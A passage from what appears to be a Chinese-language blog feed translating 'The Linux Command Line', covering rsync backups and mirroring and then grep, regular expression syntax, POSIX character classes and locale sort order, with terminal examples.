<p>接下来，我们将用 rsync 同步 playground 目录和 foo 中的对应副本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rsync -av playground foo</span><br></pre></td></tr></table></figure>

<p>我们包含了 -a 选项（用于归档 - 导致递归和保留文件属性）和 -v 选项（详细输出），以在 foo 中制作 playground 目录的<em>镜像</em>。当命令运行时，我们会看到正在被复制的文件和目录的列表。最后，我们会看到这样的总结消息，指示进行的复制量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sent 135759 bytes received 57870 bytes 387258.00 bytes/sec</span><br><span class="line">total size is 3230 speedup is 0.02</span><br></pre></td></tr></table></figure>

<p>如果我们再次运行命令，会看到不同的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rsync -av playground foo</span><br><span class="line">building file list ... <span class="keyword">done</span></span><br><span class="line">sent 22635 bytes received 20 bytes 45310.00 bytes/sec</span><br><span class="line">total size is 3230 speedup is 0.14</span><br></pre></td></tr></table></figure>

<p>注意，没有文件列表。这是因为 rsync 检测到 ~&#x2F;playground 和 ~&#x2F;foo&#x2F;playground 之间没有差异，因此不需要复制任何内容。如果我们修改 playground 中的一个文件，然后再次运行 rsync：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> playground/dir-099/file-Z</span><br><span class="line">[me@linuxbox ~]$ rsync -av playground foo</span><br><span class="line">building file list ... <span class="keyword">done</span></span><br><span class="line">playground/dir-099/file-Z</span><br><span class="line">sent 22685 bytes received 42 bytes 45454.00 bytes/sec</span><br><span class="line">total size is 3230 speedup is 0.14</span><br></pre></td></tr></table></figure>

<p>我们会看到 rsync 检测到了更改，并且只复制了更新的文件。</p>
<p>在指定 rsync 源时，有一个微妙但有用的功能。让我们考虑两个目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<p>目录 source 包含一个名为 file1 的文件，目录 destination 为空。如果我们像这样执行 source 到 destination 的复制：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rsync <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<p>那么 rsync 会将目录 source 复制到 destination。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> destination</span><br><span class="line"><span class="built_in">source</span></span><br></pre></td></tr></table></figure>

<p>然而，如果我们在源目录名称后附加一个尾随的 &#x2F;，rsync 将只复制 source 目录的内容，</p>
<p>而不是目录本身。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rsync <span class="built_in">source</span>/ destination</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> destination</span><br><span class="line">file1</span><br></pre></td></tr></table></figure>

<p>这很方便，如果我们只想复制目录的内容而不在目的地创建另一个目录层级。我们可以将其视为与 source&#x2F;* 的结果类似，但这种方法会复制 source 目录的所有内容，包括隐藏文件。</p>
<p>作为一个实际示例，让我们考虑之前与 tar 一起使用的假想外部硬盘。如果我们将驱动器连接到我们的系统，它再次在 &#x2F;media&#x2F;BigDisk 下挂载，我们可以通过首先在外部驱动器上创建名为 &#x2F;backup 的目录，然后使用 rsync 将我们系统上最重要的东西复制到外部驱动器上，执行有用的系统备份。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> /media/BigDisk/backup</span><br><span class="line">[me@linuxbox ~]$ sudo rsync -av --delete /etc /home /usr/local /media/BigDisk/backup</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们将 &#x2F;etc、&#x2F;home 和 &#x2F;usr&#x2F;local 目录从我们的系统复制到了我们的假想存储设备上。我们包括了 –delete 选项以删除可能已经存在于备份设备上但不再存在于源设备上的文件（第一次制作备份时这无关紧要，但在随后的复制中会有用）。重复连接外部驱动器并运行这个 rsync 命令的过程将是保持小型系统备份的一个有用（尽管不是理想的）方法。当然，这里也有一个别名会有帮助。我们可以创建一个别名并将其添加到我们的 .bashrc 文件中，以提供这个功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> backup=<span class="string">&#x27;sudo rsync -av --delete /etc /home /usr/local /media/BigDisk/backup&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在，我们所要做的就是连接我们的外部驱动器并运行 backup 命令来完成任务。</p>
<h4 id="使用-rsync-进行网络传输"><a href="#使用-rsync-进行网络传输" class="headerlink" title="使用 rsync 进行网络传输"></a>使用 rsync 进行网络传输</h4><p>rsync 的真正美妙之处之一是它可以用来通过网络复制文件。毕竟，rsync 中的 r 代表“远程”。远程复制可以通过两种方式完成。第一种方式是使用已安装 rsync 的另一系统，以及像 ssh 这样的远程 shell 程序。假设我们在本地网络上有另一个系统，有大量可用的硬盘空间，我们想使用远程系统而不是外部驱动器来执行我们的备份操作。假设它已经有了一个名为 &#x2F;backup 的目录，我们可以将文件传送到那里，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo rsync -av --delete --rsh=ssh /etc /home /usr/local remote-sys:/backup</span><br></pre></td></tr></table></figure>

<p>我们对命令进行了两处更改，以便进行网络复制。首先，我们添加了 –rsh&#x3D;ssh 选项，指示 rsync 使用 ssh 程序作为其远程 shell。</p>
<p>这样，我们能够使用 ssh 加密隧道安全地将数据从本地系统传输到远程主机。其次，我们通过在目的地路径名前添加远程主机的名称（在这种情况下，远程主机被命名为 remote-sys）来指定远程主机。</p>
<p>rsync 用于通过网络同步文件的第二种方式是使用 <em>rsync 服务器</em>。可以配置 rsync 作为守护进程运行，并监听传入的同步请求。这通常用于允许远程系统的镜像。例如，Red Hat 软件维护着其 Fedora 发行版正在开发中的大型软件包存储库。在发行周期的测试阶段，对软件测试人员而言，镜像此集合非常有用。由于存储库中的文件频繁更改（通常一天多次），通过定期同步而不是批量复制存储库来维护本地镜像是可取的。杜克大学保留了其中一个存储库；我们可以使用我们本地的 rsync 和他们的 rsync 服务器来镜像它，像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> fedora-devel</span><br><span class="line">[me@linuxbox ~]$ rsync -av --delete rsync://archive.linux.duke.edu/fedora/linux/development/rawhide/Everything/x86_64/os/ fedora-devel</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们使用了远程 rsync 服务器的 URI，它包括一个协议 (rsync:&#x2F;&#x2F;)，后跟远程主机名 (archive.linux.duke.edu)，然后是存储库的路径名。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们回顾了 Linux 和其他类 Unix 操作系统上常用的压缩和归档程序。对于归档文件，tar&#x2F;gzip 组合是类 Unix 系统上的首选方法，而 zip&#x2F;unzip 用于与 Windows 系统的互操作性。最后，我们看了 rsync 程序（个人最喜欢的），它对于高效同步跨系统的文件和目录非常方便。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>这里讨论的所有命令的手册页都相当清晰，并包含有用的示例。此外，GNU 项目为其 tar 版本提供了一个很好的在线手册。可以在这里找到：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL3Rhci9tYW51YWwvaW5kZXguaHRtbA==">http://www.gnu.org/software/tar/manual/index.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2024/04/19-regular-expressions/</url>
    <content><![CDATA[<h2 id="19章-正则表达式"><a href="#19章-正则表达式" class="headerlink" title="19章 - 正则表达式"></a>19章 - 正则表达式</h2><p>在接下来的几章中，我们将探讨用于处理文本的工具。正如我们所见，文本数据在所有类 Unix 系统（如 Linux）上扮演着重要角色。但在我们能充分欣赏这些工具提供的所有功能之前，我们首先需要研究一个与这些工具的最复杂用途经常相关的技术——<em>正则表达式</em>。</p>
<p>当我们浏览命令行提供的许多功能和设施时，我们遇到了一些真正晦涩的 shell 特性和命令，比如 shell 扩展和引用、键盘快捷键和命令历史记录，更不用说 vi 编辑器了。正则表达式继续这个“传统”，可以说是它们中最晦涩的特性。这并不是说学习它们所花费的时间不值得。恰恰相反，良好的理解将使我们能够执行惊人的技巧，尽管它们的全部价值可能不会立即显现。</p>
<span id="more"></span>

<p>什么是正则表达式？</p>
<p>简单地说，正则表达式是用来识别文本中模式的符号表示。在某些方面，它们类似于 shell 的通配符匹配文件和路径名的方法，但规模更大。正则表达式被许多命令行工具和大多数编程语言支持，以便解决文本操作问题。然而，为了进一步增加混乱，不是所有的正则表达式都是相同的；它们在不同工具和编程语言之间略有差异。对于我们的讨论，我们将限制自己在 POSIX 标准中描述的正则表达式（这将涵盖大多数命令行工具），而不是许多编程语言（尤其是 <em>Perl</em>），它们使用略微更大、更丰富的符号集。</p>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>我们将用来处理正则表达式的主要程序是我们的老朋友 grep。”grep” 这个名字实际上源自 “global regular expression print” 这个短语，所以我们可以看出 grep 与正则表达式有某种关系。本质上，grep 在文本文件中搜索匹配指定正则表达式的文本出现，并将包含匹配的任何行输出到标准输出。</p>
<p>到目前为止，我们使用 grep 来处理固定字符串，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin | grep zip</span><br></pre></td></tr></table></figure>

<p>这将列出 &#x2F;usr&#x2F;bin 目录中名称包含子字符串 zip 的所有文件。</p>
<p>grep 程序接受选项和参数的方式如下，其中 <em>regex</em> 是一个正则表达式：</p>
<p><strong>grep [</strong><em><strong>options</strong></em>] <em><strong>regex</strong></em> [<em><strong>file…</strong></em>]</p>
<p>表 19-1 描述了常用的 grep 选项。</p>
<p><em>表 19-1:</em> <em>grep 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>–ignore-case</td>
<td>忽略大小写。不区分大写和小写字符。</td>
</tr>
<tr>
<td>-v</td>
<td>–invert-match</td>
<td>反向匹配。通常，grep 打印包含匹配项的行。此选项使 grep 打印不包含匹配项的每一行。</td>
</tr>
<tr>
<td>-c</td>
<td>–count</td>
<td>打印匹配数（如果也指定了 -v 选项，则打印非匹配数）而不是行本身。</td>
</tr>
<tr>
<td>-l</td>
<td>–files-with-matches</td>
<td>打印包含匹配项的每个文件的名称，而不是行本身。</td>
</tr>
<tr>
<td>-L</td>
<td>–files-without-match</td>
<td>类似于 -l 选项，但仅打印不包含匹配项的文件名称。</td>
</tr>
<tr>
<td>-n</td>
<td>–line-number</td>
<td>在每个匹配行前加上该行在文件中的行号。</td>
</tr>
<tr>
<td>-h</td>
<td>–no-filename</td>
<td>对于多文件搜索，抑制文件名的输出。</td>
</tr>
</tbody></table>
<p>为了更全面地探索 grep，让我们创建一些文本文件来搜索。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /bin &gt; dirlist-bin.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin &gt; dirlist-usr-bin.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /sbin &gt; dirlist-sbin.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/sbin &gt; dirlist-usr-sbin.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> dirlist*.txt</span><br><span class="line">dirlist-bin.txt dirlist-sbin.txt dirlist-usr-sbin.txt</span><br><span class="line">dirlist-usr-bin.txt</span><br></pre></td></tr></table></figure>

<p>我们可以像这样执行文件列表的简单搜索：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep bzip dirlist*.txt</span><br><span class="line">dirlist-bin.txt:bzip2</span><br><span class="line">dirlist-bin.txt:bzip2recover</span><br></pre></td></tr></table></figure>

<p>在这个例子中，grep 搜索所有列出的文件以查找字符串 bzip，并在文件 dirlist-bin.txt 中找到两个匹配项。如果我们只对包含匹配项的文件列表感兴趣，而不是匹配项本身，我们可以指定 -l 选项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -l bzip dirlist*.txt</span><br><span class="line">dirlist-bin.txt</span><br></pre></td></tr></table></figure>

<p>相反，如果我们只想看到不包含匹配项的文件列表，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -L bzip dirlist*.txt</span><br><span class="line">dirlist-sbin.txt</span><br><span class="line">dirlist-usr-bin.txt</span><br><span class="line">dirlist-usr-sbin.txt</span><br></pre></td></tr></table></figure>

<h4 id="元字符和字面量"><a href="#元字符和字面量" class="headerlink" title="元字符和字面量"></a>元字符和字面量</h4><p>虽然可能不太明显，但我们的 grep 搜索一直在使用正则表达式，尽管非常简单。正则表达式 bzip 被理解为只有当文件中的行包含至少四个字符，并且在某处按顺序找到字符 b、z、i 和 p，中间没有其他字符时，才会发生匹配。字符串 bzip 中的字符都是<em>字面量字符</em>，它们与自身匹配。除了字面量之外，正则表达式还可能包含用于指定更复杂匹配的<em>元字符</em>。正则表达式的元字符包括以下内容：</p>
<p><strong>^ $ . [ ] { } - ? * + ( ) | \</strong></p>
<p>所有其他字符都被视为字面量，尽管反斜杠字符在一些情况下用于创建<em>元序列</em>，以及允许元字符被转义并作为字面量处理，而不是被解释为元字符。</p>
<p><strong>注意：</strong> 如我们所见，许多正则表达式元字符也是在进行扩展时对 shell 有意义的字符。当我们在命令行上传递包含元字符的正则表达式时，将它们用引号括起来以防止 shell 尝试扩展它们是至关重要的。</p>
<h4 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h4><p>我们将要看的第一个元字符是点或句点字符，用于匹配任意字符。如果我们在正则表达式中包含它，它将匹配该字符位置的任何字符。这里有一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;.zip&#x27;</span> dirlist*.txt</span><br><span class="line">bunzip2</span><br><span class="line">bzip2</span><br><span class="line">bzip2recover</span><br><span class="line">gunzip</span><br><span class="line">gzip</span><br><span class="line">funzip</span><br><span class="line">gpg-zip</span><br><span class="line">preunzip</span><br><span class="line">prezip</span><br><span class="line">prezip-bin</span><br><span class="line">unzip</span><br><span class="line">unzipsfx</span><br></pre></td></tr></table></figure>

<p>我们搜索了所有文件中与正则表达式 .zip 匹配的任何行。关于结果有几点值得注意。注意 zip 程序没有被找到。这是因为我们在正则表达式中包含了点元字符，将所需匹配的长度增加到四个字符，而由于名称 zip 只包含三个字符，因此不匹配。此外，如果我们的列表中的任何文件包含了文件扩展名 .zip，它们也会被匹配，因为文件扩展名中的句点字符也会被“任意字符”匹配。</p>
<h4 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h4><p>在正则表达式中，插入符号 (^) 和美元符号 (<code>$) 被视为*锚点*。这意味着它们会导致匹配仅在行的开头 (^) 或行的结尾 ($</code>) 发生。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;^zip&#x27;</span> dirlist*.txt</span><br><span class="line">zip</span><br><span class="line">zipcloak</span><br><span class="line">zipgrep</span><br><span class="line">zipinfo</span><br><span class="line">zipnote</span><br><span class="line">zipsplit</span><br><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;zip$&#x27;</span> dirlist*.txt</span><br><span class="line">gunzip</span><br><span class="line">gzip</span><br><span class="line">funzip</span><br><span class="line">gpg-zip</span><br><span class="line">preunzip</span><br><span class="line">prezip</span><br><span class="line">unzip</span><br><span class="line">zip</span><br><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;^zip$&#x27;</span> dirlist*.txt</span><br><span class="line">zip</span><br></pre></td></tr></table></figure>

<p>这里我们搜索了文件列表中位于行开头、行尾、以及行的开头和结尾（即，独自位于行上）的字符串 zip。请注意，正则表达式 ^$（一个开头和一个结尾之间没有任何东西）将匹配空行。</p>
<p><strong>填字游戏助手</strong></p>
<p>即使到目前为止，我们对正则表达式的了解有限，我们也可以做一些有用的事情。</p>
<p>我的妻子喜欢填字游戏，有时她会问我某个特定问题的帮助。比如，“什么是第三个字母是‘j’，最后一个字母是‘r’的五个字母的</p>
<p>单词，意思是……？” 这种问题让我开始思考。</p>
<p>你知道你的 Linux 系统中包含了一个字典吗？确实如此。看看 &#x2F;usr&#x2F;share&#x2F;dict 目录，你可能会发现一个或几个。那里的字典文件只是按字母顺序排列的长单词列表，每行一个。在我的系统上，words 文件包含了超过 98,500 个单词。为了找到上述填字游戏问题的可能答案，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -i <span class="string">&#x27;^..j.r$&#x27;</span> /usr/share/dict/words</span><br><span class="line">Major</span><br><span class="line">major</span><br></pre></td></tr></table></figure>

<p>使用这个正则表达式，我们可以在字典文件中找到所有长度为五个字母的单词，其中第三个位置是 j，最后一个位置是 r。</p>
<h4 id="括号表达式和字符类"><a href="#括号表达式和字符类" class="headerlink" title="括号表达式和字符类"></a>括号表达式和字符类</h4><p>除了在正则表达式的给定位置匹配任意字符外，我们还可以使用<em>括号表达式</em>从指定的字符集中匹配单个字符。通过括号表达式，我们可以指定一组字符（包括那些否则会被解释为元字符的字符）来进行匹配。在这个例子中，使用两个字符的集合，我们匹配包含字符串 bzip 或 gzip 的任何行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;[bg]zip&#x27;</span> dirlist*.txt</span><br><span class="line">bzip2</span><br><span class="line">bzip2recover</span><br><span class="line">gzip </span><br></pre></td></tr></table></figure>

<p>一个集合可以包含任意数量的字符，当放在括号中时，元字符会失去其特殊含义。然而，在括号表达式中有两种情况会使用元字符，并且有不同的含义。第一种情况是插入符号 (^)，用来表示否定；第二种是破折号 (-)，用来表示字符范围。</p>
<h5 id="否定"><a href="#否定" class="headerlink" title="否定"></a>否定</h5><p>如果括号表达式中的第一个字符是插入符号 (^)，则其余字符将被视为一组不得出现在给定字符位置的字符。我们可以通过修改我们之前的例子来做到这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;[^bg]zip&#x27;</span> dirlist*.txt</span><br><span class="line">bunzip2</span><br><span class="line">gunzip</span><br><span class="line">funzip</span><br><span class="line">gpg-zip</span><br><span class="line">preunzip</span><br><span class="line">prezip</span><br><span class="line">prezip-bin</span><br><span class="line">unzip</span><br><span class="line">unzipsfx</span><br></pre></td></tr></table></figure>

<p>启用否定后，我们得到了一系列文件列表，其中包含字符串 zip，其前面有除 b 或 g 以外的任何字符。请注意，文件 zip 没有被找到。否定的字符集仍然需要在给定位置有一个字符，但该字符不能是否定集中的成员。</p>
<p>如果插入符号是括号表达式中的第一个字符，它才会激发否定；否则，它失去其特殊含义，成为集合中的普通字符。</p>
<h5 id="传统字符范围"><a href="#传统字符范围" class="headerlink" title="传统字符范围"></a>传统字符范围</h5><p>如果我们想构建一个正则表达式，以找到我们列表中所有以大写字母开头的文件，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;^[ABCDEFGHIJKLMNOPQRSTUVWXZY]&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<p>只需在括号表达式中放置所有 26 个大写字母。但这么多打字的想法令人深感困扰，所以还有另一种方式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;^[A-Z]&#x27;</span> dirlist*.txt</span><br><span class="line">MAKEDEV</span><br><span class="line">ControlPanel</span><br><span class="line">GET </span><br><span class="line">HEAD</span><br><span class="line">POST</span><br><span class="line">X</span><br><span class="line">X11</span><br><span class="line">Xorg</span><br><span class="line">MAKEFLOPPIES</span><br><span class="line">NetworkManager</span><br><span class="line">NetworkManagerDispatcher</span><br></pre></td></tr></table></figure>

<p>通过使用三个字符的范围，我们可以缩写 26 个字母。任何字符范围都可以这样表示，包括多个范围，比如这个匹配所有以字母和数字开头的文件名的表达式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;^[A-Za-z0-9]&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<p>在字符范围中，我们看到破折号字符被特殊处理，那么我们如何实际在括号表达式中包含破折号字符呢？通过将其作为表达式中的第一个字符。考虑以下两个示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;[A-Z]&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<p>这将匹配每个文件名中包含大写字母的文件。以下将匹配每个文件名中包含破折号、大写 A 或大写 Z 的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ grep -h <span class="string">&#x27;[-AZ]&#x27;</span> dirlist*.txt</span><br></pre></td></tr></table></figure>

<h5 id="POSIX-字符类"><a href="#POSIX-字符类" class="headerlink" title="POSIX 字符类"></a>POSIX 字符类</h5><p>传统字符范围是处理快速指定字符集的问题的一</p>
<p>种容易理解且有效的方式。不幸的是，它们并不总是有效。尽管到目前为止我们在使用 grep 时没有遇到任何问题，但我们可能在使用其他程序时遇到问题。</p>
<p>在第 4 章中，我们研究了如何使用通配符进行路径名扩展。在那次讨论中，我们说字符范围可以以几乎与正则表达式中相同的方式使用，但这里有个问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/sbin/[ABCDEFGHIJKLMNOPQRSTUVWXYZ]*</span><br><span class="line">/usr/sbin/MAKEFLOPPIES</span><br><span class="line">/usr/sbin/NetworkManagerDispatcher</span><br><span class="line">/usr/sbin/NetworkManager</span><br></pre></td></tr></table></figure>

<p>（根据 Linux 发行版的不同，我们将得到不同的文件列表，可能是空列表。这个示例来自 Ubuntu）。这个命令产生了预期的结果 - 只列出了以大写字母开头的文件，但使用这个命令我们得到了完全不同的结果（只显示了结果的一部分）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/sbin/[A-Z]*</span><br><span class="line">/usr/sbin/biosdecode</span><br><span class="line">/usr/sbin/chat</span><br><span class="line">/usr/sbin/chgpasswd</span><br><span class="line">/usr/sbin/chpasswd</span><br><span class="line">/usr/sbin/chroot</span><br><span class="line">/usr/sbin/cleanup-info</span><br><span class="line">/usr/sbin/complain</span><br><span class="line">/usr/sbin/console-kit-daemon </span><br></pre></td></tr></table></figure>

<p>为什么会这样？这是个漫长的故事，但这里有个简短的版本：</p>
<p>早在 Unix 最初开发时，它只知道 ASCII 字符，这个特性反映了这个事实。在 ASCII 中，前 32 个字符（编号 0-31）是控制代码（比如制表符、退格符和回车）。接下来的 32 个字符（编号 32-63）包含可打印字符，包括大多数标点符号和数字 0-9。接下来的 32 个字符（编号 64-95）包含大写字母和更多标点符号。最后的 31 个字符（编号 96-126）包含小写字母和更多标点符号。基于这种排列，使用 ASCII 的系统使用了一个<em>排序顺序</em>，看起来像这样：</p>
<p><strong>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</strong></p>
<p>这与标准字典排序不同，标准字典排序是这样的：</p>
<p><strong>aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ</strong></p>
<p>随着 Unix 的普及超出美国范围，出现了对非美式英语中未出现的字符的支持需求。ASCII 表被扩展为使用完整的八位位元，添加了 128-255 号字符，这容纳了更多语言。为了支持这种能力，POSIX 标准引入了一个称为*地域设置（locale）*的概念，可以调整它来选择特定位置所需的字符集。我们可以使用这个命令查看系统的语言设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$LANG</span></span><br><span class="line">en_US.UTF-8</span><br></pre></td></tr></table></figure>

<p>在这个设置下，符合 POSIX 标准的应用程序将使用字典排序顺序而不是 ASCII 排序。这解释了前面命令的行为。当以字典排序解释时，字符范围 [A-Z] 包括了所有字母字符，除了小写的 a，因此我们得到了这样的结果。</p>
<p>为了部分解决这个问题，POSIX 标准包括了一些字符类，它们提供了如表 19-2 中描述的有用字符范围。</p>
<p>表 19-2: POSIX 字符类</p>
<table>
<thead>
<tr>
<th><strong>字符类</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>字母数字字符。在 ASCII 中，相当于 [A-Za-z0-9]。</td>
</tr>
<tr>
<td>[:word:]</td>
<td>与 [:alnum:] 相同，但添加了下划线 (_) 字符。</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>字母字符。在 ASCII 中，相当于 [A-Za-z]。</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>包括空格和制表符字符。</td>
</tr>
<tr>
<td>[:cntrl:]</td>
<td>ASCII 控制代码。包括 ASCII 字符 0 到 31 和 127。</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>数字 0 到 9。</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>可见字符。在 ASCII 中，包括字符 33 到 126。</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>小写字母。</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>标点字符。在 ASCII 中，相当于 [-!”#$%&amp;’()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[\]_`{|}~]。</td>
</tr>
<tr>
<td>[:print:]</td>
<td>可打印字符。[:graph:] 中的所有字符加上空格字符。</td>
</tr>
<tr>
<td>[:space:]</td>
<td>空白字符，包括空格、制表符、回车、换行、垂直制表符和换页符。在 ASCII 中，相当于 [ \t\r\n\v\f]。</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>大写字符。</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>用于表示十六进制数字的字符。在 ASCII 中，相当于 [0-9A-Fa-f]。</td>
</tr>
</tbody></table>
<p>即使有了字符类，仍然没有方便的方法来表达部分范围，比如 [A-M]。</p>
<p>使用字符类，我们可以重复我们的目录列表，并看到改进的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/sbin/[[:upper:]]*</span><br><span class="line">/usr/sbin/MAKEFLOPPIES</span><br><span class="line">/usr/sbin/NetworkManagerDispatcher</span><br><span class="line">/usr/sbin/NetworkManager</span><br></pre></td></tr></table></figure>

<p>然而，请记住，这不是正则表达式的示例；相反，它是 shell 执行路径名扩展。我们在这里展示它是因为 POSIX 字符类可以用于这两种情况。</p>
<h4 id="恢复到传统排序顺序"><a href="#恢复到传统排序顺序" class="headerlink" title="恢复到传统排序顺序"></a><strong>恢复到传统排序顺序</strong></h4><p>您可以选择让您的系统使用传统的（ASCII）排序顺序，方法是更改 LANG 环境变量的值。正如我们之前看到的，LANG 变量包含了您所在地区使用的语言和字符集的名称</p>
<p>。这个值最初是在您安装 Linux 版本时选择了安装语言时确定的。</p>
<p>要查看地区设置，请使用 locale 命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ locale</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">LC_CTYPE=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_NUMERIC=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_TIME=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_COLLATE=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_MONETARY=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_MESSAGES=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_PAPER=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_NAME=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_ADDRESS=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_TELEPHONE=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_MEASUREMENT=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_IDENTIFICATION=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">LC_ALL=</span><br></pre></td></tr></table></figure>

<p>要更改地区设置以使用传统的 Unix 行为，请将 LANG 变量设置为 POSIX。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">export</span> LANG=POSIX</span><br></pre></td></tr></table></figure>

<p>请注意，此更改会将系统转换为使用美式英语（更具体地说，是 ASCII）作为其字符集，因此请确保这确实是您想要的。</p>
<p>您可以通过将以下行添加到 .bashrc 文件中来使此更改永久生效。</p>
<p><strong>export LANG&#x3D;POSIX</strong></p>
